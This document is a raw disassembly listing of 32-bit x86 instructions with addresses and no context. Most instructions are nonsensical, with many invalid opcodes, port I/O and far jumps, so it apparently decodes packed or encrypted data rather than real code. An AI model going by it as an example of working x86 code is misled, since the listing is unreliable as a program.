  421556:	xchg   BYTE PTR [ecx+eiz*4],dl
  421559:	adc    BYTE PTR [edx],0xf
  42155c:	in     eax,dx
  42155d:	pop    ss
  42155e:	jmp    0x0:0xfde
  421565:	add    BYTE PTR [eax],al
  421567:	add    BYTE PTR [eax],al
  421569:	add    BYTE PTR [edi+0x5a],dl
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x64af80b5
  421579:	jne    0x4215c5
  42157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	jg     0x421586
  421580:	add    BYTE PTR [eax],al
  421582:	mov    ecx,0xbfc865f6
  421587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421588:	mov    dh,0xec
  42158a:	cmp    eax,0x59ef9076
  42158f:	rcr    DWORD PTR [ebx-0x77],0x4b
  421593:	mov    bh,0x1e
  421595:	loop   0x42160c
  421597:	leave  
  421598:	fdivp  st(0),st
  42159a:	cmc    
  42159b:	push   edi
  42159c:	sbb    al,al
  42159e:	ficom  DWORD PTR [ecx+0xe240ceb]
  4215a4:	shl    DWORD PTR [ecx+0x39d956b9],1
  4215aa:	stos   BYTE PTR es:[edi],al
  4215ab:	push   ss
  4215ac:	add    al,0xef
  4215ae:	int    0x17
  4215b0:	les    ebx,FWORD PTR [ecx+0x6c]
  4215b3:	int3   
  4215b4:	fucomip st,st(0)
  4215b6:	addr16 push esi
  4215b8:	scas   al,BYTE PTR es:[edi]
  4215b9:	icebp  
  4215ba:	jae    0x421567
  4215bc:	cmp    edx,ebx
  4215be:	xchg   ebx,eax
  4215bf:	mov    ds:0xc839f62,eax
  4215c4:	adc    BYTE PTR [eax],0x0
  4215c7:	dec    edx
  4215c8:	mov    eax,0x39413161
  4215cd:	dec    esi
  4215ce:	ins    DWORD PTR es:[edi],dx
  4215cf:	and    ecx,DWORD PTR [edx]
  4215d1:	xchg   esp,eax
  4215d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215d3:	popa   
  4215d4:	sbb    DWORD PTR [esp+eax*4],esp
  4215d7:	mov    WORD PTR [ebp+0xf3bf0ae],cs
  4215dd:	xchg   ebp,eax
  4215de:	pop    ebx
  4215df:	add    eax,0xe1caa847
  4215e4:	sbb    eax,DWORD PTR [edx-0x587aac7e]
  4215ea:	push   edx
  4215eb:	ds daa 
  4215ed:	xchg   DWORD PTR [edx-0x4d],edx
  4215f0:	adc    al,ch
  4215f2:	stos   BYTE PTR es:[edi],al
  4215f3:	xor    ah,al
  4215f5:	in     eax,0xf8
  4215f7:	sbb    dh,BYTE PTR [ebx-0x2d]
  4215fa:	ret    0x477d
  4215fd:	pop    ebp
  4215fe:	idiv   DWORD PTR [ecx-0x1b]
  421601:	adc    BYTE PTR [edx+0x1cb1d905],cl
  421607:	mov    esi,0x83e21ecc
  42160c:	cdq    
  42160d:	jns    0x42165b
  42160f:	dec    esp
  421610:	xchg   ecx,eax
  421611:	je     0x42161b
  421613:	pop    ds
  421614:	popf   
  421615:	stos   DWORD PTR es:[edi],eax
  421616:	push   ss
  421617:	dec    ebp
  421618:	ds mov dl,0x8d
  42161b:	ja     0x4215e5
  42161d:	retf   
  42161e:	jp     0x421689
  421620:	out    dx,eax
  421621:	cmp    al,0x61
  421623:	js     0x421615
  421625:	and    ecx,DWORD PTR fs:[ebx+0x5096df1]
  42162c:	loopne 0x421663
  42162e:	int3   
  42162f:	sub    BYTE PTR [esi+0x3f586ee7],0x5e
  421636:	mov    edx,0xa74de2f3
  42163b:	out    dx,eax
  42163c:	mov    ebp,0xd0cade7c
  421641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421642:	cmp    cl,cl
  421644:	ret    0xc7e0
  421647:	cdq    
  421648:	push   ss
  421649:	mov    cl,0x2d
  42164b:	jg     0x42163f
  42164d:	outs   dx,BYTE PTR ds:[esi]
  42164e:	out    dx,al
  42164f:	xor    eax,0xc6aac26f
  421654:	push   0xffffffb5
  421656:	and    edx,ebp
  421658:	dec    esi
  421659:	hlt    
  42165a:	push   edi
  42165b:	stos   DWORD PTR es:[edi],eax
  42165c:	add    dh,BYTE PTR [ebx-0x24b151eb]
  421662:	mov    bh,0x3c
  421664:	mov    eax,0xd8dd74fc
  421669:	pop    ebx
  42166a:	jae    0x421623
  42166c:	lds    edx,FWORD PTR [eax]
  42166e:	adc    DWORD PTR [edx-0x74],0x6393b592
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	retf   
  421677:	daa    
  421678:	cmp    ecx,DWORD PTR [edx+ebx*2-0x47]
  42167c:	pop    edi
  42167d:	sub    cl,BYTE PTR [eax]
  42167f:	jnp    0x4216b7
  421681:	sub    eax,0xbbdd86a5
  421686:	cdq    
  421687:	call   0xadc9:0xa31bd5a7
  42168e:	fdiv   DWORD PTR [edx-0x7303ef68]
  421694:	jmp    0x3a6e:0xd53b2f14
  42169b:	lahf   
  42169c:	sub    DWORD PTR [ebx+ebx*2-0x790fcb95],esp
  4216a3:	icebp  
  4216a4:	scas   eax,DWORD PTR es:[edi]
  4216a5:	ret    0x29bf
  4216a8:	jmp    0xa9ee:0xc774b0b5
  4216af:	icebp  
  4216b0:	fwait
  4216b1:	es cwde 
  4216b3:	std    
  4216b4:	aam    0xed
  4216b6:	pop    ebp
  4216b7:	mov    ch,0xaf
  4216b9:	cmp    esp,ebp
  4216bb:	(bad)  
  4216bc:	rcl    DWORD PTR [esi+0x5f],cl
  4216bf:	imul   ebx,DWORD PTR [eax+0x25b9b31],0xe499daf5
  4216c9:	pop    ss
  4216ca:	mov    ds:0x8464ad13,eax
  4216cf:	mov    WORD PTR [edi+0x360cdfc4],?
  4216d5:	sti    
  4216d6:	lds    edi,FWORD PTR [ebx]
  4216d8:	push   0x64ef794a
  4216dd:	cmc    
  4216de:	out    dx,al
  4216df:	test   BYTE PTR ds:0x4d4c1fec,cl
  4216e5:	jnp    0x421703
  4216e7:	rcl    BYTE PTR [ebp+esi*2-0x57],1
  4216eb:	cwde   
  4216ec:	retf   0x73cd
  4216ef:	aad    0x65
  4216f1:	dec    ebx
  4216f2:	jmp    0xb55343de
  4216f7:	cmp    eax,0x6457e6e2
  4216fc:	test   eax,0x5a5e2578
  421701:	push   ecx
  421702:	scas   al,BYTE PTR es:[edi]
  421703:	aas    
  421704:	push   0x9b30fe3
  421709:	(bad)  
  42170a:	push   es
  42170b:	or     di,0x44
  42170f:	mov    BYTE PTR [ecx-0x2504ff10],cl
  421715:	dec    esi
  421716:	scas   eax,DWORD PTR es:[edi]
  421717:	sub    DWORD PTR [esi-0xe],ebx
  42171a:	inc    eax
  42171b:	lods   al,BYTE PTR ds:[esi]
  42171c:	mov    ah,0x79
  42171e:	in     al,0x62
  421720:	(bad)  
  421721:	pop    ecx
  421722:	test   ecx,edi
  421724:	fdiv   DWORD PTR [edi-0x5]
  421727:	inc    esi
  421728:	ficomp DWORD PTR [edi-0x24c04cba]
  42172e:	sub    al,BYTE PTR [ecx+0x75c77128]
  421734:	stc    
  421735:	fs lahf 
  421737:	sbb    al,BYTE PTR [esi-0x56668cb3]
  42173d:	aas    
  42173e:	add    eax,0x93038085
  421743:	rep ds stos DWORD PTR es:[edi],eax
  421746:	or     DWORD PTR [ebp-0x6b334c9c],edi
  42174c:	add    eax,0x44efc4a4
  421751:	daa    
  421752:	jne    0x421792
  421754:	js     0x421704
  421756:	cmp    edx,DWORD PTR [ebx]
  421758:	lods   al,BYTE PTR ds:[esi]
  421759:	adc    al,0x6d
  42175b:	int    0x82
  42175d:	cdq    
  42175e:	jle    0x42170d
  421760:	loope  0x42173a
  421762:	ds xchg esp,eax
  421764:	cmp    cl,BYTE PTR [ebp+edx*2+0x1f012207]
  42176b:	pop    ebx
  42176c:	repnz xchg edi,eax
  42176e:	cmp    eax,0xc5d38f45
  421773:	shl    DWORD PTR [ebx+0x33],0x48
  421777:	push   0x4b
  421779:	and    dl,ah
  42177b:	mov    bh,0xb7
  42177d:	dec    edi
  42177e:	lds    ebx,FWORD PTR fs:[edi]
  421781:	or     BYTE PTR [edi],0x80
  421784:	mov    ecx,0x42905705
  421789:	test   eax,0xb96d4538
  42178e:	jp     0x421718
  421790:	inc    esi
  421791:	xchg   esi,eax
  421792:	push   esi
  421793:	lods   al,BYTE PTR ds:[esi]
  421794:	in     al,0xf8
  421796:	in     al,0xf3
  421798:	mov    ebp,0x1a8ee685
  42179d:	xchg   esp,eax
  42179e:	mov    al,ds:0x69d268bf
  4217a3:	pop    esi
  4217a4:	push   esp
  4217a5:	or     eax,0xd5e5f23e
  4217aa:	sbb    eax,0xb988776b
  4217af:	call   0x8051:0xf143fb1a
  4217b6:	mov    esp,0x9ebec881
  4217bb:	outs   dx,DWORD PTR ds:[esi]
  4217bc:	cmp    al,0x44
  4217be:	fdivr  st(4),st
  4217c0:	addr16 jle 0x421769
  4217c3:	xor    DWORD PTR [esp+ebp*2+0x71edf8f8],esi
  4217ca:	mov    cl,0x64
  4217cc:	retf   
  4217cd:	call   DWORD PTR [ecx]
  4217cf:	jmp    0x4217eb
  4217d1:	test   eax,0xc12eed42
  4217d6:	sub    al,0x33
  4217d8:	xor    eax,0xa27d0ba6
  4217dd:	and    DWORD PTR [edi-0x28],ebx
  4217e0:	xchg   edi,eax
  4217e1:	jmp    0x4217be
  4217e3:	xchg   ebx,eax
  4217e4:	(bad)  
  4217e5:	xchg   ecx,eax
  4217e6:	jae    0x4217c9
  4217e8:	inc    ebp
  4217e9:	stos   BYTE PTR es:[edi],al
  4217ea:	mov    es,WORD PTR [ecx-0x66]
  4217ed:	adc    edx,DWORD PTR [ebp+0x11c3579f]
  4217f3:	mov    bl,0x9
  4217f5:	mov    eax,ds:0xd2acf027
  4217fa:	(bad)  
  4217fb:	loop   0x421802
  4217fd:	pop    esp
  4217fe:	(bad)  
  421800:	mov    al,ds:0xf9c089c0
  421805:	jecxz  0x421798
  421807:	outs   dx,DWORD PTR ds:[esi]
  421808:	mov    bh,BYTE PTR [ebx]
  42180a:	in     al,dx
  42180b:	fld    QWORD PTR [edx+0x76b107de]
  421811:	jmp    0x4217bc
  421813:	mov    dh,0xc5
  421815:	push   edi
  421816:	add    esp,DWORD PTR [esp+edx*4-0x5e]
  42181a:	rcr    DWORD PTR [edi+0x52],0x2
  42181e:	inc    esp
  42181f:	dec    ebx
  421820:	fistp  WORD PTR [edx-0x27e9ed8b]
  421826:	jno    0x42183c
  421828:	mov    ecx,ebp
  42182a:	or     ebx,esi
  42182c:	es pop ss
  42182e:	adc    esp,DWORD PTR [eax+0x66]
  421831:	or     dh,BYTE PTR [esi-0x4]
  421834:	mov    ds:0x6e9587d3,eax
  421839:	or     DWORD PTR [eax+0x53e366bf],0x812bd51d
  421843:	retf   
  421844:	icebp  
  421845:	cli    
  421846:	mov    eax,0xdf753cf3
  42184c:	push   0xffffffc4
  42184e:	dec    eax
  42184f:	add    dl,dl
  421851:	push   edi
  421852:	push   esi
  421853:	mov    ?,WORD PTR [edi]
  421855:	les    esi,FWORD PTR [esi-0x7746fafd]
  42185b:	and    BYTE PTR [esi-0x14],ah
  42185e:	js     0x4218cf
  421860:	out    0x1a,al
  421862:	mov    edi,0xa9387c9c
  421867:	pop    edi
  421868:	adc    eax,0x5374b303
  42186d:	or     al,0xb7
  42186f:	push   esp
  421870:	dec    esp
  421871:	cmp    al,0x24
  421873:	or     DWORD PTR [eax],edi
  421875:	in     eax,0x1c
  421877:	not    DWORD PTR [ebp+0x25]
  42187a:	call   0x5a7c:0x2af7d9b3
  421881:	lock or al,0x76
  421884:	cs ins DWORD PTR es:[edi],dx
  421886:	and    DWORD PTR [esi],ecx
  421888:	in     al,0x95
  42188a:	pop    eax
  42188b:	dec    ecx
  42188c:	daa    
  42188d:	push   esi
  42188e:	in     eax,0xba
  421890:	dec    ebx
  421891:	pop    edx
  421892:	cdq    
  421893:	(bad)  
  421894:	jnp    0x4218b4
  421896:	mov    WORD PTR [ebp-0x57],es
  421899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42189a:	sti    
  42189b:	inc    ebx
  42189c:	pop    eax
  42189d:	ins    BYTE PTR es:[edi],dx
  42189e:	sbb    ecx,DWORD PTR [ebp-0x49]
  4218a1:	(bad)  
  4218a2:	and    ebx,esp
  4218a4:	inc    ebx
  4218a5:	sub    BYTE PTR [edx-0x33],al
  4218a8:	xchg   ecx,eax
  4218a9:	jb     0x421868
  4218ab:	xchg   esp,eax
  4218ac:	rcl    dh,cl
  4218ae:	inc    ebx
  4218af:	jmp    0xda95:0x54d1f9bd
  4218b6:	ret    0x664e
  4218b9:	push   0xfffffffb
  4218bb:	inc    ecx
  4218bc:	xchg   ecx,eax
  4218bd:	ja     0x421922
  4218bf:	stmxcsr DWORD PTR [esi]
  4218c2:	mov    ebx,0x91efb3fa
  4218c7:	ret    0x5b51
  4218ca:	or     BYTE PTR [esi+0x7d],ah
  4218cd:	or     DWORD PTR [edi],ebx
  4218cf:	retf   0x6d04
  4218d2:	push   edi
  4218d3:	adc    edi,DWORD PTR [edi+0x66360ef9]
  4218d9:	retf   0x1139
  4218dc:	(bad)  
  4218dd:	jb     0x4218b2
  4218df:	lods   eax,DWORD PTR ds:[esi]
  4218e0:	loopne 0x42194b
  4218e2:	xor    al,0x9d
  4218e4:	dec    edi
  4218e5:	xchg   esp,eax
  4218e6:	xchg   edx,eax
  4218e7:	sbb    ch,BYTE PTR [edx]
  4218e9:	adc    ebx,edi
  4218eb:	jle    0x421952
  4218ed:	inc    BYTE PTR [esi+0x59]
  4218f0:	mov    ds:0x5742729d,al
  4218f5:	or     al,0x94
  4218f7:	jno    0x421912
  4218f9:	inc    ebx
  4218fa:	push   ds
  4218fb:	dec    edx
  4218fc:	mov    ecx,0xf74a787e
  421901:	jb     0x421906
  421903:	mov    dh,0x29
  421905:	mov    esi,0xc8268974
  42190a:	mov    al,0x17
  42190c:	inc    ecx
  42190d:	jmp    0x8204:0xfd5a4148
  421914:	pop    ebx
  421915:	repnz push esp
  421917:	and    BYTE PTR [esi],dh
  421919:	jecxz  0x42195b
  42191b:	jge    0x42195e
  42191d:	mov    bh,BYTE PTR [ecx-0x67f9f079]
  421923:	cmp    BYTE PTR [eax-0x1e],cl
  421926:	push   eax
  421927:	les    eax,FWORD PTR [ecx+0x42ed88d6]
  42192d:	in     al,dx
  42192e:	repnz int 0x5c
  421931:	cli    
  421932:	xor    edx,DWORD PTR [ecx]
  421934:	pop    eax
  421935:	out    dx,al
  421936:	test   DWORD PTR [edi+ecx*4-0x2a],esp
  42193a:	jmp    0x4218dd
  42193c:	sahf   
  42193d:	adc    eax,0x43741bf2
  421942:	pop    edx
  421943:	mov    WORD PTR [eax],fs
  421945:	in     al,0x28
  421947:	mov    ds:0x37f5eff3,eax
  42194c:	sub    BYTE PTR [ecx+ebx*2-0x4c],dl
  421950:	leave  
  421951:	push   edx
  421952:	mov    BYTE PTR [eax],dh
  421954:	enter  0x14d8,0xa4
  421958:	enter  0xbff9,0xb9
  42195c:	lahf   
  42195d:	push   ebp
  42195e:	pop    ecx
  42195f:	clc    
  421960:	cmp    BYTE PTR [ebx],dh
  421962:	pop    ebp
  421963:	leave  
  421964:	dec    eax
  421965:	push   ss
  421966:	int3   
  421967:	xor    eax,0x1388baad
  42196c:	and    edi,edi
  42196e:	leave  
  42196f:	call   0x2f0226e2
  421974:	or     ch,bl
  421976:	push   esi
  421977:	inc    edx
  421978:	enter  0x708f,0x63
  42197c:	shr    esi,cl
  42197e:	aam    0xd0
  421980:	jp     0x421965
  421982:	in     al,dx
  421983:	xor    esi,DWORD PTR [ecx]
  421985:	ds mov esp,0x7719383f
  42198b:	aas    
  42198c:	cs test eax,0xcf3d4954
  421992:	call   0x3011d0fe
  421997:	or     BYTE PTR [ebp-0x4b],0x9c
  42199b:	fucomi st,st(0)
  42199d:	sbb    bl,bh
  42199f:	add    DWORD PTR [edi-0x39],ebx
  4219a2:	push   edx
  4219a3:	add    DWORD PTR [ecx],esi
  4219a5:	sub    ecx,DWORD PTR [ecx-0xa00a1b2]
  4219ab:	loope  0x4219f9
  4219ad:	pop    ecx
  4219ae:	add    al,0x9b
  4219b0:	pop    ds
  4219b1:	jmp    0x9d52ac73
  4219b6:	out    dx,al
  4219b7:	push   edi
  4219b8:	jp     0x421988
  4219ba:	dec    edi
  4219bb:	xchg   ecx,eax
  4219bc:	mov    esi,0x12ab3ffd
  4219c1:	cs cmc 
  4219c3:	call   0x26c3:0x81b04a94
  4219ca:	jge    0x42194c
  4219cc:	icebp  
  4219cd:	xor    DWORD PTR [ebx],edi
  4219cf:	cmp    bl,bh
  4219d1:	outs   dx,BYTE PTR ds:[esi]
  4219d2:	sahf   
  4219d3:	mov    al,0xb3
  4219d5:	(bad)  
  4219d6:	xchg   edi,eax
  4219d7:	addr16 mov edi,0xfcd53be5
  4219dd:	adc    al,0x43
  4219df:	das    
  4219e0:	sbb    bl,dl
  4219e2:	cs sbb ax,0x6993
  4219e7:	xor    al,0xe1
  4219e9:	arpl   WORD PTR [ecx+0x5f08a6f],dx
  4219ef:	jmp    0x7a92c258
  4219f4:	and    DWORD PTR [edi-0x405f4a0],edi
  4219fa:	and    eax,0x1972b45e
  4219ff:	nop
  421a00:	mov    edx,cs
  421a02:	enter  0x66f6,0x60
  421a06:	(bad)  
  421a08:	xor    al,0x7a
  421a0a:	jo     0x421a62
  421a0c:	adc    DWORD PTR [edx+ecx*2-0x73c5e8eb],edx
  421a13:	sbb    bl,cl
  421a15:	or     eax,DWORD PTR [edi]
  421a17:	or     bh,BYTE PTR [ecx-0x74]
  421a1a:	adc    al,0xb9
  421a1c:	fisttp WORD PTR [ebp-0x4b7f781e]
  421a22:	(bad)  [ebp-0x2]
  421a25:	retf   0x8abc
  421a28:	(bad)  
  421a29:	or     edx,DWORD PTR [ecx]
  421a2b:	mov    ah,0x50
  421a2d:	aas    
  421a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a2f:	adc    ch,BYTE PTR [esi-0x38]
  421a32:	cmc    
  421a33:	in     al,0x1
  421a35:	cld    
  421a36:	stc    
  421a37:	shr    DWORD PTR [ecx-0x25],1
  421a3a:	or     DWORD PTR [eax+0xde01fb6],ebp
  421a40:	in     al,0xa7
  421a42:	(bad)
  421a45:	push   edi
  421a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a47:	dec    ebp
  421a48:	sub    eax,DWORD PTR [ecx]
  421a4a:	push   0x30
  421a4c:	fs xchg edi,eax
  421a4e:	xchg   ch,bh
  421a50:	inc    ebp
  421a51:	or     ecx,DWORD PTR [ebp+0x22]
  421a54:	and    ch,BYTE PTR [eax-0x7bc71be3]
  421a5a:	fst    QWORD PTR [eax+0xf593fed]
  421a60:	cmp    BYTE PTR [ecx],0x99
  421a63:	in     al,0x9e
  421a65:	in     eax,0x63
  421a67:	jl     0x421a61
  421a69:	dec    edx
  421a6a:	mov    bh,0x46
  421a6c:	mov    eax,ds:0x1c6e252e
  421a71:	jp     0x421ae9
  421a73:	sbb    DWORD PTR [eax+0x103fd9df],ecx
  421a79:	xor    eax,0x6f38c2c8
  421a7e:	in     al,0x7b
  421a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a81:	pusha  
  421a82:	push   ecx
  421a83:	inc    esp
  421a84:	add    DWORD PTR [ecx],0x62
  421a87:	scas   eax,DWORD PTR es:[edi]
  421a88:	js     0x421b06
  421a8a:	xor    DWORD PTR [ebp-0x1f],0x609c095b
  421a91:	cwde   
  421a92:	sbb    dh,al
  421a94:	ret    
  421a95:	adc    eax,0xb8b68ce7
  421a9a:	(bad)  
  421a9b:	mov    edi,0x293586f1
  421aa0:	or     dh,al
  421aa2:	sti    
  421aa3:	xchg   ebx,eax
  421aa4:	mov    eax,ds:0x4f9a898c
  421aa9:	sub    ebp,edi
  421aab:	into   
  421aac:	ja     0x421ad1
  421aae:	test   al,0x7c
  421ab0:	jg     0x421ad0
  421ab2:	xchg   esp,eax
  421ab3:	jg     0x421a80
  421ab5:	and    al,bl
  421ab7:	ret    0xde41
  421aba:	jmp    0xdd47a02f
  421abf:	xor    eax,0x2f46da64
  421ac4:	mov    dh,0x58
  421ac6:	sub    DWORD PTR ds:0xcba988bb,0x548ca408
  421ad0:	sbb    DWORD PTR [edi],esp
  421ad2:	clc    
  421ad3:	inc    eax
  421ad4:	lea    ebp,[esi]
  421ad6:	pop    ecx
  421ad7:	inc    ecx
  421ad8:	lock in al,0x1e
  421adb:	adc    eax,0x85a3598a
  421ae0:	dec    edx
  421ae1:	std    
  421ae2:	lea    edx,[edx]
  421ae4:	ds std 
  421ae6:	jmp    0x87c3380f
  421aeb:	iret   
  421aec:	sbb    BYTE PTR [edx-0x7b],cl
  421aef:	xor    ebp,DWORD PTR [edx+0x30]
  421af2:	xor    al,0x95
  421af4:	inc    ebp
  421af5:	sbb    DWORD PTR [ebp-0x30],ebp
  421af8:	sahf   
  421af9:	xchg   BYTE PTR [eax-0x1d],al
  421afc:	jmp    0xc1bc:0xc2c0b370
  421b03:	or     esi,eax
  421b05:	dec    ecx
  421b06:	sub    al,0x2
  421b08:	push   ecx
  421b09:	xchg   eax,edi
  421b0b:	leave  
  421b0c:	inc    esi
  421b0d:	in     eax,dx
  421b0e:	loope  0x421b3d
  421b10:	or     ecx,DWORD PTR [ecx]
  421b12:	scas   al,BYTE PTR es:[edi]
  421b13:	jge    0x421b30
  421b15:	push   ebp
  421b16:	sbb    bl,BYTE PTR [ebp+0x1c]
  421b19:	jno    0x421af9
  421b1b:	jae    0x421b25
  421b1d:	cli    
  421b1e:	jno    0x421b1a
  421b20:	sub    al,0xb9
  421b22:	jmp    0xfeff3143
  421b27:	sub    bh,BYTE PTR [edi]
  421b29:	mov    ecx,0x71d59f85
  421b2e:	pop    es
  421b2f:	dec    ebp
  421b30:	cmp    dh,ch
  421b32:	inc    esi
  421b33:	xchg   ebx,eax
  421b34:	shr    BYTE PTR [ecx-0x24a2ce23],0xf8
  421b3b:	pop    ebp
  421b3c:	leave  
  421b3d:	push   0xffffffeb
  421b3f:	xchg   ebp,eax
  421b40:	test   eax,0xb5e1a64c
  421b45:	popf   
  421b46:	xor    ecx,DWORD PTR [eax-0x596e2996]
  421b4c:	jl     0x421b0d
  421b4e:	ins    BYTE PTR es:[edi],dx
  421b4f:	adc    BYTE PTR [ebx-0x20556f2a],ch
  421b55:	data16 (bad) 
  421b58:	retf   0x8f2b
  421b5b:	popf   
  421b5c:	push   edx
  421b5d:	add    BYTE PTR [edx+0x26e422a],dl
  421b63:	jno    0x421b77
  421b65:	cmp    ebx,DWORD PTR [ebx+0x79]
  421b68:	xchg   BYTE PTR [ebp+0x5],ch
  421b6b:	cli    
  421b6c:	push   0x1a
  421b6e:	mov    eax,0x3c1813ed
  421b73:	popa   
  421b74:	mov    edi,0xfee2cf63
  421b79:	jne    0x421b43
  421b7b:	inc    ebp
  421b7c:	ds add al,ah
  421b7f:	jl     0x421b83
  421b81:	push   edx
  421b82:	pop    esp
  421b83:	scas   al,BYTE PTR es:[edi]
  421b84:	xchg   DWORD PTR [edx+0x687c56dc],esp
  421b8a:	je     0x421b9e
  421b8c:	jo     0x421b7c
  421b8e:	mov    edi,0xc3de66be
  421b93:	mov    ds:0x7583f696,al
  421b98:	or     DWORD PTR [eax+0x2625abf6],ebp
  421b9e:	adc    ah,BYTE PTR [edx]
  421ba0:	adc    eax,0x721ebf89
  421ba5:	jnp    0x421c08
  421ba7:	mov    esp,DWORD PTR [ecx-0x5802e1c5]
  421bad:	ror    BYTE PTR [ebx+eiz*2],0xc3
  421bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bb2:	push   edx
  421bb3:	out    0xc2,al
  421bb5:	mov    esp,0x57a75c56
  421bba:	cld    
  421bbb:	push   ebp
  421bbc:	push   ds
  421bbd:	mov    al,ds:0x25985a46
  421bc2:	bound  ebx,QWORD PTR ds:0x8809f675
  421bc8:	mov    edx,0x86145d3e
  421bcd:	push   ebp
  421bce:	loope  0x421c0e
  421bd0:	call   esi
  421bd2:	daa    
  421bd3:	mov    eax,0x3a85b576
  421bd8:	fwait
  421bd9:	push   eax
  421bda:	cmp    eax,0x364d02f4
  421bdf:	sub    al,0x7f
  421be1:	and    BYTE PTR ds:0x8e65e1a6,0x6a
  421be8:	or     eax,0x95f9d13
  421bed:	pop    esp
  421bee:	adc    al,0xd6
  421bf0:	mov    BYTE PTR [edx-0x39d302fe],ah
  421bf6:	or     al,0xaa
  421bf8:	sbb    DWORD PTR [ecx+0xea8322f],esi
  421bfe:	sub    BYTE PTR [edx+0xe6],0x0
  421c05:	add    BYTE PTR [eax],al
  421c07:	add    BYTE PTR [eax],al
  421c09:	add    BYTE PTR [esi+0x43],dl
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x434a168e]
  421c18:	xchg   ecx,eax
  421c19:	cmp    eax,0x1aac9
  421c1e:	jg     0x421c26
  421c20:	add    BYTE PTR [eax],al
  421c22:	fstenv [eax-0x63]
  421c26:	push   0x985dcc39
  421c2b:	test   al,0x39
  421c2d:	daa    
  421c2e:	xor    ecx,ebp
  421c30:	mov    ds:0xf4fd45f3,eax
  421c35:	mov    ah,dl
  421c37:	jecxz  0x421bd5
  421c39:	mov    ah,BYTE PTR [ebx-0x26f44a07]
  421c3f:	adc    eax,0xab309a06
  421c44:	pop    es
  421c45:	adc    dl,bl
  421c47:	cld    
  421c48:	ja     0x421bfa
  421c4a:	cdq    
  421c4b:	pop    esi
  421c4c:	xchg   ebx,eax
  421c4d:	(bad)  
  421c4e:	jae    0x421c30
  421c50:	mov    ebp,0x1c7f844b
  421c55:	inc    edx
  421c56:	cmp    BYTE PTR [ecx+0x17],0x9a
  421c5a:	mov    dl,0xc8
  421c5c:	and    BYTE PTR [eax-0x7f94df21],ah
  421c62:	fistp  WORD PTR ds:0xea357e3f
  421c68:	lods   eax,DWORD PTR ds:[esi]
  421c69:	pop    es
  421c6a:	outs   dx,DWORD PTR ds:[esi]
  421c6b:	pop    edx
  421c6c:	jno    0x421c20
  421c6e:	xchg   ah,dl
  421c70:	out    dx,al
  421c71:	test   al,0x41
  421c73:	push   edx
  421c74:	add    BYTE PTR [ebx+0x29],cl
  421c77:	fld    QWORD PTR [edi+0x9]
  421c7a:	or     eax,0xa66016e
  421c7f:	lea    esp,[esi-0x42]
  421c82:	pusha  
  421c83:	mov    DWORD PTR [ecx-0x49718301],ebp
  421c89:	cdq    
  421c8a:	push   ds
  421c8b:	ss (bad) 
  421c8e:	and    ebp,ebx
  421c90:	sahf   
  421c91:	nop
  421c92:	rcl    dh,1
  421c94:	out    0x87,eax
  421c96:	pushf  
  421c97:	jge    0x421c60
  421c99:	mov    bl,bl
  421c9b:	lods   al,BYTE PTR ds:[esi]
  421c9c:	and    BYTE PTR [edx+ebx*8+0x14],bh
  421ca0:	gs inc eax
  421ca2:	int3   
  421ca3:	dec    cx
  421ca5:	xchg   ebx,eax
  421ca6:	sub    eax,0xa1fdf5c2
  421cab:	mov    ah,0x5d
  421cad:	push   edi
  421cae:	jno    0x421d0a
  421cb0:	mov    esi,0x5a0ee3b3
  421cb5:	out    0x7c,al
  421cb7:	mov    al,0x1c
  421cb9:	xchg   ebx,eax
  421cba:	int    0x56
  421cbc:	mov    ch,0x2e
  421cbe:	stos   DWORD PTR es:[edi],eax
  421cbf:	sahf   
  421cc0:	pop    ds
  421cc1:	out    0xd7,eax
  421cc3:	mov    edx,0xa3f02df9
  421cc8:	jmp    0x421cda
  421cca:	add    eax,0x4722c285
  421ccf:	dec    ecx
  421cd0:	jnp    0x421cfa
  421cd2:	adc    DWORD PTR [ebp-0x5f23ed14],ebp
  421cd8:	jmp    0xff23:0x7c10a0e9
  421cdf:	pop    eax
  421ce0:	jb     0x421d41
  421ce2:	outs   dx,DWORD PTR ds:[esi]
  421ce3:	rcr    DWORD PTR ss:[eax-0x5bef874d],1
  421cea:	push   edx
  421ceb:	(bad)  
  421cec:	dec    al
  421cee:	mov    ecx,0xabf8b568
  421cf3:	jns    0x421d4a
  421cf5:	pop    esi
  421cf6:	pop    ebx
  421cf7:	sar    BYTE PTR [edi-0x60b0a5bb],1
  421cfd:	mov    esp,0xa86a3385
  421d02:	std    
  421d03:	and    eax,0x74652ce4
  421d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d09:	xor    esi,edx
  421d0b:	mov    eax,0x1d35f387
  421d10:	das    
  421d11:	add    BYTE PTR [eax+eax*2+0x103b78a5],dl
  421d18:	sub    eax,0x465a5ea8
  421d1d:	mov    edi,0xcf788bc3
  421d22:	mov    eax,ds:0xc3322877
  421d27:	(bad)  
  421d28:	push   edx
  421d29:	xchg   edx,eax
  421d2a:	pushf  
  421d2b:	cmp    al,BYTE PTR [edx]
  421d2d:	aad    0xfb
  421d2f:	jp     0x421d98
  421d31:	jb     0x421d5c
  421d33:	mov    BYTE PTR [ebx+ebx*8-0x61],al
  421d37:	jo     0x421d1e
  421d39:	imul   esi,DWORD PTR [eax-0x78],0x27e2dc6c
  421d40:	dec    esp
  421d41:	imul   ebx,DWORD PTR [edi+0x15416636],0xffffffcc
  421d48:	or     DWORD PTR [edx],edx
  421d4a:	clc    
  421d4b:	or     al,0x11
  421d4d:	fld    TBYTE PTR [eax]
  421d4f:	inc    esi
